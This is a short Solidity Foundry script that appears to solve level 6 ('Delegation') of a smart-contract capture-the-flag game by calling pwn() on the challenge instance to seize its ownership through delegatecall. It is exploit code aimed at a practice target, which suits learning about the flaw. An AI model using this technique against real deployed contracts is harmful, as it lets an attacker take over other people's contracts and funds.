// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IDelegate {
    function pwn() external;
}

// ================================================================
// │                        LEVEL 6 - DELEGATION                  │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IDelegate targetContract = IDelegate(targetContractAddress);

        vm.startBroadcast();
        targetContract.pwn();
        vm.stopBroadcast();
    }
}
